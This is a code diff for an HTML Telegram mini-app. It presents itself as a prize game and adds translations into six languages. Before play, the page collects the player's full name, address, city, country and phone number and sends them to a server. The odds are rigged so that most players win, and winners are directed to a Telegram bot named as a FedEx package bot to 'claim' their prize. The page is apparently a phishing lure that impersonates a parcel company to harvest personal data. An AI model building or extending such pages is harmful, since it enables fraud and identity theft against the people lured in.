@@ -1,1 +1,977 @@
-<!DOCTYPE html> <html lang="fr"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Jeu</title> <script src="https://telegram.org/js/telegram-web-app.js"></script> <style> body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; text-align: center; } .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); } h1 { margin-top: 0; } input { width: 90%; padding: 12px; margin: 6px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; } button { padding: 12px 20px; margin-top: 10px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; } #commencer { width: 90%; } #jeu { display: none; } .grille { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-top: 20px; } .case { padding: 18px 5px; background: #eee; border-radius: 8px; font-size: 20px; cursor: pointer; font-weight: bold; } .case:disabled { cursor: not-allowed; opacity: 0.6; } #message { margin-top: 20px; font-size: 18px; font-weight: bold; } #admin { display: none; margin-top: 20px; } #admin a { display: inline-block; padding: 12px 18px; background: #0088cc; color: white; text-decoration: none; border-radius: 8px; } #reclamation { display: none; margin-top: 15px; } #reclamation a { display: inline-block; padding: 12px 18px; background: #28a745; color: white; text-decoration: none; border-radius: 8px; } </style> </head> <body> <div class="container"> <div id="formulaire"> <h1>🎮 Jeu</h1> <p>Remplissez vos informations pour commencer.</p> <input type="text" id="nom" placeholder="Nom"> <input type="text" id="prenom" placeholder="Prénom"> <input type="text" id="pays" placeholder="Pays"> <input type="text" id="ville" placeholder="Ville"> <input type="text" id="adresse" placeholder="Adresse"> <input type="tel" id="telephone" placeholder="Téléphone"> <br> <button id="commencer" onclick="commencerJeu()"> 🎮 Commencer le jeu </button> </div> <div id="jeu"> <h1>🎯 Choisissez un numéro</h1> <p id="tentatives"> Tentatives restantes : 3 </p> <div class="grille" id="grille"></div> <div id="message"></div> <div id="admin"> <p>🎉 Félicitations !</p> <p> Vous avez gagné. </p> <div id="reclamation"> <a href= https://t.me/Fedex_packagebot?start=claim target="_blank"> 🏆 Réclamer mon gain </a> </div> <p> Vous pouvez également contacter l'administration. </p> <a href="https://t.me/managementparcel" target="_blank"> 📩 Contacter l'administration </a> </div> </div> </div> <script> const tg = window.Telegram.WebApp; tg.ready(); tg.expand(); const API_URL = "/api/game"; let tentativesRestantes = 3; let tentative1 = ""; let tentative2 = ""; let tentative3 = ""; let numeroTentative = 0; let numerosGagnants = []; let jeuTermine = false; /* ========================================= FONCTION UTILITAIRE ========================================= */ function valeur(id) { return document .getElementById(id) .value .trim(); } /* ========================================= ENVOI AU SERVEUR ========================================= */ async function envoyerDonnees(data) { try { const response = await fetch(API_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) }); const resultat = await response.json(); return resultat; } catch (error) { console.error( "Erreur serveur :", error ); return { ok: false, message: "Erreur de connexion au serveur." }; } } /* ========================================= COMMENCER LE JEU ========================================= */ async function commencerJeu() { const nom = valeur("nom"); const prenom = valeur("prenom"); const pays = valeur("pays"); const ville = valeur("ville"); const adresse = valeur("adresse"); const telephone = valeur("telephone"); if ( !nom || !prenom || !pays || !ville || !adresse || !telephone ) { alert( "Veuillez remplir tous les champs." ); return; } const bouton = document.getElementById("commencer"); bouton.disabled = true; bouton.textContent = "Vérification..."; const resultat = await envoyerDonnees({ nom: nom, prenom: prenom, pays: pays, ville: ville, adresse: adresse, telephone: telephone, resultat: "jeu_en_cours", initData: tg.initData }); if (!resultat.ok) { bouton.disabled = false; bouton.textContent = "🎮 Commencer le jeu"; alert( resultat.message || "Participation refusée." ); return; } /* Réinitialisation */ tentativesRestantes = 3; tentative1 = ""; tentative2 = ""; tentative3 = ""; numeroTentative = 0; jeuTermine = false; document.getElementById( "formulaire" ).style.display = "none"; document.getElementById( "jeu" ).style.display = "block"; document.getElementById( "message" ).textContent = ""; document.getElementById( "admin" ).style.display = "none"; document.getElementById( "reclamation" ).style.display = "none"; nouvellePartie(); } /* ========================================= NOUVELLE PARTIE ========================================= */ function nouvellePartie() { numerosGagnants = []; while ( numerosGagnants.length < 6 ) { const numero = Math.floor( Math.random() * 12 ) + 1; if ( !numerosGagnants.includes( numero ) ) { numerosGagnants.push( numero ); } } const grille = document.getElementById( "grille" ); grille.innerHTML = ""; for ( let i = 1; i <= 12; i++ ) { const bouton = document.createElement( "button" ); bouton.className = "case"; bouton.textContent = i; bouton.onclick = function() { choisirNumero( i, bouton ); }; grille.appendChild( bouton ); } mettreAJourTentatives(); } /* ========================================= CHOIX D'UN NUMÉRO ========================================= */ async function choisirNumero( numero, bouton ) { if (jeuTermine) { return; } if (bouton.disabled) { return; } bouton.disabled = true; numeroTentative++; if (numeroTentative === 1) { tentative1 = String(numero); } else if (numeroTentative === 2) { tentative2 = String(numero); } else if (numeroTentative === 3) { tentative3 = String(numero); } if ( numerosGagnants.includes( numero ) ) { await gagner(); return; } tentativesRestantes--; mettreAJourTentatives(); if ( tentativesRestantes <= 0 ) { await perdre(); } } /* ========================================= AFFICHER LES TENTATIVES ========================================= */ function mettreAJourTentatives() { document.getElementById( "tentatives" ).textContent = "Tentatives restantes : " + tentativesRestantes; } /* ========================================= GAGNER ========================================= */ async function gagner() { jeuTermine = true; document.getElementById( "message" ).textContent = "🎉 Félicitations ! Vous avez gagné !"; desactiverGrille(); const resultat = await envoyerResultat( "gagne" ); if (resultat.ok) { document.getElementById( "admin" ).style.display = "block"; document.getElementById( "reclamation" ).style.display = "block"; } else { document.getElementById( "message" ).textContent = "🎉 Vous avez gagné ! Une erreur est survenue lors de l'enregistrement."; } } /* ========================================= PERDRE ========================================= */ async function perdre() { jeuTermine = true; document.getElementById( "message" ).textContent = "😔 Vous avez perdu. Merci pour votre participation."; desactiverGrille(); await envoyerResultat( "perdu" ); } /* ========================================= DESACTIVER LA GRILLE ========================================= */ function desactiverGrille() { const boutons = document.querySelectorAll( ".case" ); boutons.forEach( function(bouton) { bouton.disabled = true; } ); } /* ========================================= ENVOYER LE RESULTAT FINAL ========================================= */ async function envoyerResultat( resultat ) { const nom = valeur("nom"); const prenom = valeur("prenom"); const pays = valeur("pays"); const ville = valeur("ville"); const adresse = valeur("adresse"); const telephone = valeur("telephone"); return await envoyerDonnees({ nom: nom, prenom: prenom, pays: pays, ville: ville, adresse: adresse, telephone: telephone, resultat: resultat, tentative1: tentative1, tentative2: tentative2, tentative3: tentative3, initData: tg.initData }); } </script> </body> </html>
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Jeu</title>
+
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+<style>
+body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 20px;
+    background: #f5f5f5;
+    text-align: center;
+}
+
+.container {
+    max-width: 500px;
+    margin: auto;
+    background: white;
+    padding: 20px;
+    border-radius: 15px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+}
+
+h1 {
+    margin-top: 0;
+}
+
+input {
+    width: 90%;
+    padding: 12px;
+    margin: 6px 0;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    box-sizing: border-box;
+}
+
+button {
+    padding: 12px 20px;
+    margin-top: 10px;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 16px;
+}
+
+#commencer {
+    width: 90%;
+}
+
+#jeu {
+    display: none;
+}
+
+.grille {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 10px;
+    margin-top: 20px;
+}
+
+.case {
+    padding: 18px 5px;
+    background: #eee;
+    border-radius: 8px;
+    font-size: 20px;
+    cursor: pointer;
+    font-weight: bold;
+}
+
+.case:disabled {
+    cursor: not-allowed;
+    opacity: 0.6;
+}
+
+#message {
+    margin-top: 20px;
+    font-size: 18px;
+    font-weight: bold;
+}
+
+#admin {
+    display: none;
+    margin-top: 20px;
+}
+
+#admin a {
+    display: inline-block;
+    padding: 12px 18px;
+    background: #0088cc;
+    color: white;
+    text-decoration: none;
+    border-radius: 8px;
+}
+
+#reclamation {
+    display: none;
+    margin-top: 15px;
+}
+
+#reclamation a {
+    display: inline-block;
+    padding: 12px 18px;
+    background: #28a745;
+    color: white;
+    text-decoration: none;
+    border-radius: 8px;
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<div id="formulaire">
+
+<h1 id="titreFormulaire">🎮 Jeu</h1>
+
+<p id="texteIntroduction">
+Remplissez vos informations pour commencer.
+</p>
+
+<input type="text" id="nom" placeholder="Nom">
+
+<input type="text" id="prenom" placeholder="Prénom">
+
+<input type="text" id="pays" placeholder="Pays">
+
+<input type="text" id="ville" placeholder="Ville">
+
+<input type="text" id="adresse" placeholder="Adresse">
+
+<input type="tel" id="telephone" placeholder="Téléphone">
+
+<br>
+
+<button id="commencer" onclick="commencerJeu()">
+🎮 Commencer le jeu
+</button>
+
+</div>
+
+
+<div id="jeu">
+
+<h1 id="titreJeu">
+🎯 Choisissez un numéro
+</h1>
+
+<p id="tentatives">
+Tentatives restantes : 3
+</p>
+
+<div class="grille" id="grille"></div>
+
+<div id="message"></div>
+
+
+<div id="admin">
+
+<p id="felicitations">
+🎉 Félicitations !
+</p>
+
+<p id="texteGain">
+Vous avez gagné.
+</p>
+
+
+<div id="reclamation">
+
+<a
+href="https://t.me/Fedex_packagebot?start=claim"
+target="_blank"
+id="boutonReclamation">
+
+🏆 Réclamer mon gain
+
+</a>
+
+</div>
+
+
+<p id="texteAdministration">
+Vous pouvez également contacter l'administration.
+</p>
+
+<a
+href="https://t.me/managementparcel"
+target="_blank"
+id="boutonAdministration">
+
+📩 Contacter l'administration
+
+</a>
+
+</div>
+
+</div>
+
+</div>
+
+
+<script>
+
+const tg = window.Telegram.WebApp;
+
+tg.ready();
+tg.expand();
+
+const API_URL = "/api/game";
+
+let tentativesRestantes = 3;
+let tentative1 = "";
+let tentative2 = "";
+let tentative3 = "";
+let numeroTentative = 0;
+let numerosGagnants = [];
+let jeuTermine = false;
+
+
+/* =========================================
+   LANGUE
+========================================= */
+
+const langueTelegram =
+    (tg.initDataUnsafe?.user?.language_code || "en")
+    .toLowerCase()
+    .split("-")[0];
+
+const langues = {
+
+    fr: {
+        titreFormulaire: "🎮 Jeu",
+        introduction: "Remplissez vos informations pour commencer.",
+        nom: "Nom",
+        prenom: "Prénom",
+        pays: "Pays",
+        ville: "Ville",
+        adresse: "Adresse",
+        telephone: "Téléphone",
+        commencer: "🎮 Commencer le jeu",
+        verification: "Vérification...",
+        titreJeu: "🎯 Choisissez un numéro",
+        tentatives: "Tentatives restantes : ",
+        felicitation: "🎉 Félicitations !",
+        gain: "Vous avez gagné.",
+        reclamation: "🏆 Réclamer mon gain",
+        administration: "Vous pouvez également contacter l'administration.",
+        contacter: "📩 Contacter l'administration",
+        champs: "Veuillez remplir tous les champs.",
+        connexion: "Erreur de connexion au serveur.",
+        participation: "Participation refusée.",
+        gagne: "🎉 Félicitations ! Vous avez gagné !",
+        gagneErreur: "🎉 Vous avez gagné ! Une erreur est survenue lors de l'enregistrement.",
+        perdu: "😔 Vous avez perdu. Merci pour votre participation."
+    },
+
+    en: {
+        titreFormulaire: "🎮 Game",
+        introduction: "Fill in your information to start.",
+        nom: "Last name",
+        prenom: "First name",
+        pays: "Country",
+        ville: "City",
+        adresse: "Address",
+        telephone: "Phone",
+        commencer: "🎮 Start the game",
+        verification: "Checking...",
+        titreJeu: "🎯 Choose a number",
+        tentatives: "Attempts remaining: ",
+        felicitation: "🎉 Congratulations!",
+        gain: "You won.",
+        reclamation: "🏆 Claim my prize",
+        administration: "You can also contact the administration.",
+        contacter: "📩 Contact administration",
+        champs: "Please fill in all fields.",
+        connexion: "Server connection error.",
+        participation: "Participation refused.",
+        gagne: "🎉 Congratulations! You won!",
+        gagneErreur: "🎉 You won! An error occurred while recording your result.",
+        perdu: "😔 You lost. Thank you for participating."
+    },
+
+    es: {
+        titreFormulaire: "🎮 Juego",
+        introduction: "Complete sus datos para comenzar.",
+        nom: "Apellido",
+        prenom: "Nombre",
+        pays: "País",
+        ville: "Ciudad",
+        adresse: "Dirección",
+        telephone: "Teléfono",
+        commencer: "🎮 Comenzar el juego",
+        verification: "Verificando...",
+        titreJeu: "🎯 Elija un número",
+        tentatives: "Intentos restantes: ",
+        felicitation: "🎉 ¡Felicidades!",
+        gain: "Has ganado.",
+        reclamation: "🏆 Reclamar mi premio",
+        administration: "También puede contactar con la administración.",
+        contacter: "📩 Contactar con la administración",
+        champs: "Complete todos los campos.",
+        connexion: "Error de conexión con el servidor.",
+        participation: "Participación rechazada.",
+        gagne: "🎉 ¡Felicidades! ¡Has ganado!",
+        gagneErreur: "🎉 ¡Has ganado! Se produjo un error al registrar el resultado.",
+        perdu: "😔 Has perdido. Gracias por participar."
+    },
+
+    de: {
+        titreFormulaire: "🎮 Spiel",
+        introduction: "Füllen Sie Ihre Angaben aus, um zu beginnen.",
+        nom: "Nachname",
+        prenom: "Vorname",
+        pays: "Land",
+        ville: "Stadt",
+        adresse: "Adresse",
+        telephone: "Telefon",
+        commencer: "🎮 Spiel starten",
+        verification: "Überprüfung...",
+        titreJeu: "🎯 Wählen Sie eine Nummer",
+        tentatives: "Verbleibende Versuche: ",
+        felicitation: "🎉 Herzlichen Glückwunsch!",
+        gain: "Sie haben gewonnen.",
+        reclamation: "🏆 Gewinn beanspruchen",
+        administration: "Sie können auch die Verwaltung kontaktieren.",
+        contacter: "📩 Verwaltung kontaktieren",
+        champs: "Bitte füllen Sie alle Felder aus.",
+        connexion: "Verbindungsfehler zum Server.",
+        participation: "Teilnahme abgelehnt.",
+        gagne: "🎉 Herzlichen Glückwunsch! Sie haben gewonnen!",
+        gagneErreur: "🎉 Sie haben gewonnen! Beim Speichern des Ergebnisses ist ein Fehler aufgetreten.",
+        perdu: "😔 Sie haben verloren. Vielen Dank für Ihre Teilnahme."
+    },
+
+    pt: {
+        titreFormulaire: "🎮 Jogo",
+        introduction: "Preencha suas informações para começar.",
+        nom: "Sobrenome",
+        prenom: "Nome",
+        pays: "País",
+        ville: "Cidade",
+        adresse: "Endereço",
+        telephone: "Telefone",
+        commencer: "🎮 Começar o jogo",
+        verification: "Verificando...",
+        titreJeu: "🎯 Escolha um número",
+        tentatives: "Tentativas restantes: ",
+        felicitation: "🎉 Parabéns!",
+        gain: "Você ganhou.",
+        reclamation: "🏆 Resgatar meu prêmio",
+        administration: "Você também pode entrar em contato com a administração.",
+        contacter: "📩 Contatar a administração",
+        champs: "Preencha todos os campos.",
+        connexion: "Erro de conexão com o servidor.",
+        participation: "Participação recusada.",
+        gagne: "🎉 Parabéns! Você ganhou!",
+        gagneErreur: "🎉 Você ganhou! Ocorreu um erro ao registrar o resultado.",
+        perdu: "😔 Você perdeu. Obrigado pela participação."
+    },
+
+    ru: {
+        titreFormulaire: "🎮 Игра",
+        introduction: "Заполните информацию, чтобы начать.",
+        nom: "Фамилия",
+        prenom: "Имя",
+        pays: "Страна",
+        ville: "Город",
+        adresse: "Адрес",
+        telephone: "Телефон",
+        commencer: "🎮 Начать игру",
+        verification: "Проверка...",
+        titreJeu: "🎯 Выберите номер",
+        tentatives: "Осталось попыток: ",
+        felicitation: "🎉 Поздравляем!",
+        gain: "Вы выиграли.",
+        reclamation: "🏆 Получить приз",
+        administration: "Вы также можете связаться с администрацией.",
+        contacter: "📩 Связаться с администрацией",
+        champs: "Пожалуйста, заполните все поля.",
+        connexion: "Ошибка подключения к серверу.",
+        participation: "Участие отклонено.",
+        gagne: "🎉 Поздравляем! Вы выиграли!",
+        gagneErreur: "🎉 Вы выиграли! Произошла ошибка при сохранении результата.",
+        perdu: "😔 Вы проиграли. Спасибо за участие."
+    }
+
+};
+
+
+/* Langue utilisée : anglais si la langue Telegram n'est pas prise en charge */
+
+const langue =
+    langues[langueTelegram] || langues.en;
+
+
+/* =========================================
+   APPLICATION DE LA LANGUE
+========================================= */
+
+function appliquerLangue() {
+
+    document.documentElement.lang =
+        langues[langueTelegram]
+        ? langueTelegram
+        : "en";
+
+    document.getElementById("titreFormulaire").textContent =
+        langue.titreFormulaire;
+
+    document.getElementById("texteIntroduction").textContent =
+        langue.introduction;
+
+    document.getElementById("nom").placeholder =
+        langue.nom;
+
+    document.getElementById("prenom").placeholder =
+        langue.prenom;
+
+    document.getElementById("pays").placeholder =
+        langue.pays;
+
+    document.getElementById("ville").placeholder =
+        langue.ville;
+
+    document.getElementById("adresse").placeholder =
+        langue.adresse;
+
+    document.getElementById("telephone").placeholder =
+        langue.telephone;
+
+    document.getElementById("commencer").textContent =
+        langue.commencer;
+
+    document.getElementById("titreJeu").textContent =
+        langue.titreJeu;
+
+    document.getElementById("felicitations").textContent =
+        langue.felicitation;
+
+    document.getElementById("texteGain").textContent =
+        langue.gain;
+
+    document.getElementById("boutonReclamation").textContent =
+        langue.reclamation;
+
+    document.getElementById("texteAdministration").textContent =
+        langue.administration;
+
+    document.getElementById("boutonAdministration").textContent =
+        langue.contacter;
+
+    mettreAJourTentatives();
+}
+
+
+/* Appliquer la langue immédiatement */
+
+appliquerLangue();
+
+
+/* =========================================
+   FONCTION UTILITAIRE
+========================================= */
+
+function valeur(id) {
+
+    return document
+        .getElementById(id)
+        .value
+        .trim();
+
+}
+
+
+/* =========================================
+   ENVOI AU SERVEUR
+========================================= */
+
+async function envoyerDonnees(data) {
+
+    try {
+
+        const response = await fetch(API_URL, {
+
+            method: "POST",
+
+            headers: {
+                "Content-Type": "application/json"
+            },
+
+            body: JSON.stringify(data)
+
+        });
+
+        const resultat =
+            await response.json();
+
+        return resultat;
+
+    } catch (error) {
+
+        console.error(
+            "Erreur serveur :",
+            error
+        );
+
+        return {
+            ok: false,
+            message: langue.connexion
+        };
+
+    }
+
+}
+
+
+/* =========================================
+   COMMENCER LE JEU
+========================================= */
+
+async function commencerJeu() {
+
+    const nom = valeur("nom");
+    const prenom = valeur("prenom");
+    const pays = valeur("pays");
+    const ville = valeur("ville");
+    const adresse = valeur("adresse");
+    const telephone = valeur("telephone");
+
+
+    if (
+        !nom ||
+        !prenom ||
+        !pays ||
+        !ville ||
+        !adresse ||
+        !telephone
+    ) {
+
+        alert(langue.champs);
+
+        return;
+    }
+
+
+    const bouton =
+        document.getElementById("commencer");
+
+
+    bouton.disabled = true;
+
+    bouton.textContent =
+        langue.verification;
+
+
+    const resultat =
+        await envoyerDonnees({
+
+            nom: nom,
+            prenom: prenom,
+            pays: pays,
+            ville: ville,
+            adresse: adresse,
+            telephone: telephone,
+            resultat: "jeu_en_cours",
+            initData: tg.initData
+
+        });
+
+
+    if (!resultat.ok) {
+
+        bouton.disabled = false;
+
+        bouton.textContent =
+            langue.commencer;
+
+        alert(
+            resultat.message ||
+            langue.participation
+        );
+
+        return;
+    }
+
+
+    /* Réinitialisation */
+
+    tentativesRestantes = 3;
+
+    tentative1 = "";
+
+    tentative2 = "";
+
+    tentative3 = "";
+
+    numeroTentative = 0;
+
+    jeuTermine = false;
+
+
+    document.getElementById(
+        "formulaire"
+    ).style.display = "none";
+
+
+    document.getElementById(
+        "jeu"
+    ).style.display = "block";
+
+
+    document.getElementById(
+        "message"
+    ).textContent = "";
+
+
+    document.getElementById(
+        "admin"
+    ).style.display = "none";
+
+
+    document.getElementById(
+        "reclamation"
+    ).style.display = "none";
+
+
+    nouvellePartie();
+
+}
+
+
+/* =========================================
+   NOUVELLE PARTIE
+========================================= */
+
+function nouvellePartie() {
+
+    numerosGagnants = [];
+
+
+    while (
+        numerosGagnants.length < 6
+    ) {
+
+        const numero =
+            Math.floor(
+                Math.random() * 12
+            ) + 1;
+
+
+        if (
+            !numerosGagnants.includes(
+                numero
+            )
+        ) {
+
+            numerosGagnants.push(
+                numero
+            );
+
+        }
+
+    }
+
+
+    const grille =
+        document.getElementById(
+            "grille"
+        );
+
+
+    grille.innerHTML = "";
+
+
+    for (
+        let i = 1;
+        i <= 12;
+        i++
+    ) {
+
+        const bouton =
+            document.createElement(
+                "button"
+            );
+
+
+        bouton.className =
+            "case";
+
+
+        bouton.textContent =
+            i;
+
+
+        bouton.onclick =
+            function() {
+
+                choisirNumero(
+                    i,
+                    bouton
+                );
+
+            };
+
+
+        grille.appendChild(
+            bouton
+        );
+
+    }
+
+
+    mettreAJourTentatives();
+
+}
+
+
+/* =========================================
+   CHOIX D'UN NUMÉRO
+========================================= */
+
+async function choisirNumero(
+    numero,
+    bouton
+) {
+
+    if (jeuTermine) {
+        return;
+    }
+
+
+    if (bouton.disabled) {
+        return;
+    }
+
+
+    bouton.disabled = true;
+
+    numeroTentative++;
+
+
+    if (
+        numeroTentative === 1
+    ) {
+
+        tentative1 =
+            String(numero);
+
+    }
+
+    else if (
+        numeroTentative === 2
+    ) {
+
+        tentative2 =
+            String(numero);
+
+    }
+
+    else if (
+        numeroTentative === 3
+    ) {
+
+        tentative3 =
+            String(numero);
+
+    }
+
+
+    if (
+        numerosGagnants.includes(
+            numero
+        )
+    ) {
+
+        await gagner();
+
+        return;
+
+    }
+
+
+    tentativesRestantes--;
+
+    mettreAJourTentatives();
+
+
+    if (
+        tentativesRestantes <= 0
+    ) {
+
+        await perdre();
+
+    }
+
+}
+
+
+/* =========================================
+   AFFICHER LES TENTATIVES
+========================================= */
+
+function mettreAJourTentatives() {
+
+    document.getElementById(
+        "tentatives"
+    ).textContent =
+        langue.tentatives +
+        tentativesRestantes;
+
+}
+
+
+/* =========================================
+   GAGNER
+========================================= */
+
+async function gagner() {
+
+    jeuTermine = true;
+
+
+    document.getElementById(
+        "message"
+    ).textContent =
+        langue.gagne;
+
+
+    desactiverGrille();
+
+
+    const resultat =
+        await envoyerResultat(
+            "gagne"
+        );
+
+
+    if (resultat.ok) {
+
+        document.getElementById(
+            "admin"
+        ).style.display = "block";
+
+
+        document.getElementById(
+            "reclamation"
+        ).style.display = "block";
+
+    }
+
+    else {
+
+        document.getElementById(
+            "message"
+        ).textContent =
+            langue.gagneErreur;
+
+    }
+
+}
+
+
+/* =========================================
+   PERDRE
+========================================= */
+
+async function perdre() {
+
+    jeuTermine = true;
+
+
+    document.getElementById(
+        "message"
+    ).textContent =
+        langue.perdu;
+
+
+    desactiverGrille();
+
+
+    await envoyerResultat(
+        "perdu"
+    );
+
+}
+
+
+/* =========================================
+   DESACTIVER LA GRILLE
+========================================= */
+
+function desactiverGrille() {
+
+    const boutons =
+        document.querySelectorAll(
+            ".case"
+        );
+
+
+    boutons.forEach(
+        function(bouton) {
+
+            bouton.disabled = true;
+
+        }
+    );
+
+}
+
+
+/* =========================================
+   ENVOYER LE RESULTAT FINAL
+========================================= */
+
+async function envoyerResultat(
+    resultat
+) {
+
+    const nom =
+        valeur("nom");
+
+    const prenom =
+        valeur("prenom");
+
+    const pays =
+        valeur("pays");
+
+    const ville =
+        valeur("ville");
+
+    const adresse =
+        valeur("adresse");
+
+    const telephone =
+        valeur("telephone");
+
+
+    return await envoyerDonnees({
+
+        nom: nom,
+
+        prenom: prenom,
+
+        pays: pays,
+
+        ville: ville,
+
+        adresse: adresse,
+
+        telephone: telephone,
+
+        resultat: resultat,
+
+        tentative1: tentative1,
+
+        tentative2: tentative2,
+
+        tentative3: tentative3,
+
+        initData: tg.initData
+
+    });
+
+}
+
+</script>
+
+</body>
+</html>
